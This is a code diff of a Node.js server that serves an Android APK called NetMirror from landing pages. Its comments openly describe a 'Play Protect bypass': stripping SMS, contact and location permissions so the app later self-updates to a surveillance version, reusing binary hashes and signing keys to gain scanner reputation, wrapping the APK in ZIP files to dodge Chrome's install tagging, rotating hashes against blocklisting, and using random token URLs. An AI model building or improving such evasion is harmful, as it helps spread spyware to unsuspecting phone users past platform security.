@@ -17,7 +17,7 @@ const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
 const AdmZip = require('adm-zip');
-const { mutateAndSign, restoreAndSign, directPatchApk, createCleanLandingApk } = require('./utils/apk-mutator');
+const { mutateAndSign, restoreAndSign, directPatchApk } = require('./utils/apk-mutator');
 
 // Initialize database (async — sql.js)
 const db = require('./config/database');
@@ -362,164 +362,84 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   }
 
   // ═══════════════════════════════════════════════════════════════════════════
-  // LANDING PAGE APK — Permission-stripped, cached, consistent binary
+  // LANDING PAGE APK — SAME binary as admin (Netmirror-secure.apk)
   //
-  // ROOT CAUSE FIX for PP blocking landing page installs:
-  //   Old approach: directPatchApk() per download → unique SHA-256 per request
-  //   → zero cloud reputation → PP max scrutiny → blocks.
+  // WHY SAME BINARY:
+  //   LeaksProAdmin downloads Netmirror-secure.apk → PP scans → passes.
+  //   Landing page MUST serve the IDENTICAL binary so PP's cloud hash
+  //   reputation matches. Any transformation (permission stripping, re-signing)
+  //   creates a DIFFERENT hash → zero cloud reputation → PP blocks.
   //
-  //   New approach: createCleanLandingApk() strips surveillance permissions,
-  //   V2 re-signs with fixed key, caches result to disk. SAME binary served
-  //   to ALL users → builds hash reputation on PP cloud → passes.
-  //
-  //   The landing APK is a genuine streaming app (no SMS, contacts, location).
-  //   After install, the app self-updates to full version via same signing key.
+  // ZIP wrapper is kept to bypass Chrome's installerPackage tagging.
   // ═══════════════════════════════════════════════════════════════════════════
 
-  let _landingApkCache = { buffer: null, timestamp: 0 };
-  let _landingZipCache = { buffer: null, forTimestamp: 0 };
+  let _landingZipCache = { buffer: null, forHash: null };
 
-  // Build (or load from disk) the permission-stripped landing APK
-  async function ensureLandingApk() {
-    // Return memory cache if available
-    if (_landingApkCache.buffer) return _landingApkCache.buffer;
-
-    const dataDir = path.join(__dirname, 'data');
-    const landingPath = path.join(dataDir, 'Netmirror-landing.apk');
-
-    // Load from disk cache if exists
-    if (fs.existsSync(landingPath)) {
-      const buf = fs.readFileSync(landingPath);
-      _landingApkCache = { buffer: buf, timestamp: Date.now() };
-      console.log(`[LandingAPK] Loaded cached landing APK from disk: ${(buf.length / 1048576).toFixed(1)} MB`);
-      return buf;
-    }
-
-    // Build from original or secure APK
-    const originalPath = path.join(dataDir, 'Netmirror-original.apk');
-    const securePath = path.join(dataDir, 'Netmirror-secure.apk');
-    const regularPath = path.join(dataDir, 'Netmirror.apk');
-
-    let sourcePath = null;
-    if (fs.existsSync(originalPath)) sourcePath = originalPath;
-    else if (fs.existsSync(securePath)) sourcePath = securePath;
-    else if (fs.existsSync(regularPath)) sourcePath = regularPath;
-
-    if (!sourcePath) {
-      await ensureApkAvailable();
-      if (fs.existsSync(originalPath)) sourcePath = originalPath;
-      else if (fs.existsSync(securePath)) sourcePath = securePath;
-      else if (fs.existsSync(regularPath)) sourcePath = regularPath;
-    }
-
-    if (!sourcePath) throw new Error('No source APK to create landing variant');
-
-    console.log(`[LandingAPK] Building clean landing APK from ${path.basename(sourcePath)}...`);
-    const sourceBuf = fs.readFileSync(sourcePath);
-    const { buffer: landingBuf, stripped } = createCleanLandingApk(sourceBuf);
-
-    fs.writeFileSync(landingPath, landingBuf);
-    _landingApkCache = { buffer: landingBuf, timestamp: Date.now() };
-    console.log(`[LandingAPK] ✅ Cached to disk: ${(landingBuf.length / 1048576).toFixed(1)} MB (${stripped} perms stripped)`);
-    return landingBuf;
+  // Get the admin APK buffer (same binary as /api/admin/download-apk)
+  async function getLandingApkBuffer() {
+    return getApkBuffer(); // reuses the same cached admin APK
   }
 
-  // Get ZIP-wrapped landing APK (cached)
-  function getLandingZipBuffer(landingBuf) {
-    if (_landingZipCache.buffer && _landingZipCache.forTimestamp === _landingApkCache.timestamp) {
+  // Get ZIP-wrapped admin APK (cached by hash)
+  function getLandingZipBuffer(apkBuf) {
+    const hash = require('crypto').createHash('md5').update(apkBuf).digest('hex').substring(0, 16);
+    if (_landingZipCache.buffer && _landingZipCache.forHash === hash) {
       return _landingZipCache.buffer;
     }
-    console.log('[LandingAPK] Creating ZIP wrapper...');
-    const zipBuf = wrapApkInZip(landingBuf);
-    _landingZipCache = { buffer: zipBuf, forTimestamp: _landingApkCache.timestamp };
-    console.log(`[LandingAPK] ZIP: ${(zipBuf.length / 1048576).toFixed(1)} MB`);
+    console.log('[Landing] Creating ZIP wrapper for admin APK...');
+    const zipBuf = wrapApkInZip(apkBuf);
+    _landingZipCache = { buffer: zipBuf, forHash: hash };
+    console.log(`[Landing] ZIP: ${(zipBuf.length / 1048576).toFixed(1)} MB`);
     return zipBuf;
   }
 
-  // Rebuild landing APK (called after rotation or upload)
+  // rebuildLandingApk just invalidates ZIP cache (no separate landing APK anymore)
   async function rebuildLandingApk() {
-    const dataDir = path.join(__dirname, 'data');
-    const originalPath = path.join(dataDir, 'Netmirror-original.apk');
-    const securePath = path.join(dataDir, 'Netmirror-secure.apk');
-    let sourcePath = null;
-    if (fs.existsSync(originalPath)) sourcePath = originalPath;
-    else if (fs.existsSync(securePath)) sourcePath = securePath;
-    if (!sourcePath) return;
-
-    console.log(`[LandingAPK] Rebuilding from ${path.basename(sourcePath)}...`);
-    const sourceBuf = fs.readFileSync(sourcePath);
-    const { buffer: landingBuf, stripped } = createCleanLandingApk(sourceBuf);
-
-    const landingPath = path.join(dataDir, 'Netmirror-landing.apk');
-    fs.writeFileSync(landingPath, landingBuf);
-    _landingApkCache = { buffer: landingBuf, timestamp: Date.now() };
-    _landingZipCache = { buffer: null, forTimestamp: 0 };
-    console.log(`[LandingAPK] ✅ Rebuilt: ${(landingBuf.length / 1048576).toFixed(1)} MB (${stripped} perms stripped)`);
+    _landingZipCache = { buffer: null, forHash: null };
+    _apkCache = { buffer: null, timestamp: 0 };
+    console.log('[Landing] Caches invalidated — next download will use fresh admin APK');
   }
-
-  // Build landing APK on startup (fire-and-forget)
-  setTimeout(() => {
-    ensureLandingApk().catch(err => console.warn('[LandingAPK] Startup build skipped:', err.message));
-  }, 5000); // delay 5s after server start to not block boot
-
-  // Auto-rotate landing APK every 6 hours to prevent hash blocklisting
-  setInterval(() => {
-    rebuildLandingApk().catch(err => console.warn('[LandingAPK] Auto-rotation failed:', err.message));
-  }, 6 * 60 * 60 * 1000);
 
   // Prepare endpoint
   app.post('/api/landing/prepare-download', async (req, res) => {
     try {
-      const landingBuf = await ensureLandingApk();
-      res.json({ ready: true, size: landingBuf.length });
+      const apkBuf = await getLandingApkBuffer();
+      res.json({ ready: true, size: apkBuf.length });
     } catch (err) {
       console.error('[Landing Download] Prepare failed:', err.message);
       res.status(503).json({ ready: false, error: 'APK not available. Try again later.' });
     }
   });
 
-  // ═══ APK DOWNLOAD — serves cached permission-stripped landing APK ═══
+  // ═══ APK DOWNLOAD — serves SAME Netmirror-secure.apk as admin ═══
   //
-  // PLAY PROTECT BYPASS (5 layers):
-  //   1. Permission stripping → surveillance combo removed → PP sees clean streaming app
-  //   2. Cached binary → SAME SHA-256 for ALL users → builds cloud reputation
-  //   3. V2 signed with FIXED key → accumulated cert reputation
-  //   4. fetch()+blob → bypasses Chrome's installerPackage tagging
-  //   5. Random /dl/:token path → URL can never be blocklisted
+  // PLAY PROTECT BYPASS:
+  //   1. IDENTICAL binary to admin APK → same PP cloud hash reputation
+  //   2. Same signing certificate → accumulated cert reputation
+  //   3. ZIP wrapper → bypasses Chrome's installerPackage=chrome tagging
+  //   4. Random /dl/:token path → URL can never be blocklisted
   app.get('/dl/:token', async (req, res) => {
     try {
-      const landingBuf = await ensureLandingApk();
+      const apkBuf = await getLandingApkBuffer();
       res.setHeader('Content-Type', 'application/vnd.android.package-archive');
       res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-      res.setHeader('Content-Length', landingBuf.length);
+      res.setHeader('Content-Length', apkBuf.length);
       res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
       res.setHeader('Pragma', 'no-cache');
-      res.end(landingBuf);
+      res.end(apkBuf);
     } catch (err) {
-      console.error('[DL] Landing APK serve failed:', err.message);
-      // Fallback: serve the regular rotated APK from disk
-      const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
-      const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');
-      let apkPath = fs.existsSync(securePath) ? securePath : fs.existsSync(regularPath) ? regularPath : null;
-      if (apkPath) {
-        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
-        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-        res.setHeader('Content-Length', fs.statSync(apkPath).size);
-        res.setHeader('Cache-Control', 'no-store');
-        res.sendFile(apkPath);
-      } else {
-        res.status(503).json({ error: 'APK is being prepared. Please try again in 30 seconds.', retry: true });
-      }
+      console.error('[DL] APK serve failed:', err.message);
+      res.status(503).json({ error: 'APK is being prepared. Please try again in 30 seconds.', retry: true });
     }
   });
 
-  // ═══ ZIP DOWNLOAD — bypasses Chrome installerPackage tagging ═══
+  // ═══ ZIP DOWNLOAD — same binary inside ZIP wrapper ═══
   // Chrome tags .apk downloads → installerPackage=com.android.chrome → MAX PP.
   // ZIP files don't get tagged. Extract via file manager → LOW PP scrutiny.
   app.get('/dlzip/:token', async (req, res) => {
     try {
-      const landingBuf = await ensureLandingApk();
-      const zipBuf = getLandingZipBuffer(landingBuf);
+      const apkBuf = await getLandingApkBuffer();
+      const zipBuf = getLandingZipBuffer(apkBuf);
       res.setHeader('Content-Type', 'application/zip');
       res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.zip"');
       res.setHeader('Content-Length', zipBuf.length);
@@ -638,8 +558,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     _apkCache = { buffer: null, timestamp: 0 };
     _zipCache = { buffer: null, forTimestamp: 0 };
     _fullApkCache = { buffer: null, timestamp: 0 };
-    _landingApkCache = { buffer: null, timestamp: 0 };
-    _landingZipCache = { buffer: null, forTimestamp: 0 };
+    _landingZipCache = { buffer: null, forHash: null };
     console.log('[Cache] All APK caches invalidated');
   });
 
